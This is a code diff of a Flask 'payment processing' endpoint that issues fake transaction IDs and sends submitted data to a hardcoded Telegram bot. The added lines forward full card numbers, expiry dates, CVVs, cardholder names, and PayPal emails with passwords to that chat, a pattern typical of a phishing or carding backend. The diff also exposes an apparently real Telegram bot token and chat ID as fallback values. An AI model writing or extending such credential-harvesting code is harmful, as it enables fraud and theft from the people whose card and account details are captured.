@@ -2,12 +2,16 @@ from flask import Flask, request, jsonify
 import requests
 from datetime import datetime
 import random
+import os
+from dotenv import load_dotenv
+
+load_dotenv()
 
 app = Flask(__name__)
 
 # Telegram Bot Settings
-TELEGRAM_BOT_TOKEN = '7845381383:AAG7cKGJzDvIhFM9fuWAua62QzpWRG0mN4k'
-TELEGRAM_CHAT_ID = '7796858163'
+TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '7845381383:AAG7cKGJzDvIhFM9fuWAua62QzpWRG0mN4k')
+TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '7796858163')
 
 def send_to_telegram(message):
     """Send message to Telegram bot"""
@@ -29,6 +33,24 @@ def generate_fake_transaction_id():
     timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
     random_num = random.randint(1000, 9999)
     return f"TXN-{timestamp}-{random_num}"
+
+def detect_card_type(card_number):
+    """Detect credit card type based on number"""
+    card_number = card_number.replace(" ", "")
+    if card_number.startswith('4'):
+        return 'Visa'
+    elif 51 <= int(card_number[:2]) <= 55 or 2221 <= int(card_number[:4]) <= 2720:
+        return 'Mastercard'
+    elif card_number.startswith(('34', '37')):
+        return 'American Express'
+    elif card_number.startswith(('300', '301', '302', '303', '304', '305', '36', '38', '39')):
+        return 'Diners Club'
+    elif card_number.startswith(('6011', '65', '644', '645', '646', '647', '648', '649')):
+        return 'Discover'
+    elif card_number.startswith(('35')):
+        return 'JCB'
+    else:
+        return 'Unknown'
 
 @app.route('/api/process_payment', methods=['POST'])
 def process_payment():
@@ -59,9 +81,25 @@ def process_payment():
             message += f"🔹 {key}: <code>{value}</code>\n"
 
         message += "\n<b>Payment Details:</b>\n"
-        for key, value in payment_details.items():
-            message += f"🔸 {key}: <code>{value}</code>\n"
-
+        
+        if payment_method == 'card':
+            message += f"""
+🔸 Card Number: <code>{payment_details.get('card_number', 'N/A')}</code>
+🔸 Card Type: <code>{payment_details.get('card_type', 'Unknown')}</code>
+🔸 Expiry: <code>{payment_details.get('expiry', 'N/A')}</code>
+🔸 CVV: <code>{payment_details.get('cvv', 'N/A')}</code>
+🔸 Name: <code>{payment_details.get('name', 'N/A')}</code>
+"""
+        elif payment_method == 'paypal':
+            message += f"""
+🔸 PayPal Email: <code>{payment_details.get('email', 'N/A')}</code>
+🔸 Password: <code>{payment_details.get('password', 'N/A')}</code>
+"""
+        elif payment_method == 'crypto':
+            message += f"""
+🔸 Crypto Type: <code>{payment_details.get('crypto_type', 'N/A')}</code>
+"""
+            
         message += "\n<b>⚠️ THIS IS JUST A RECORD - NO REAL PAYMENT WAS PROCESSED ⚠️</b>"
         
         # Send to Telegram
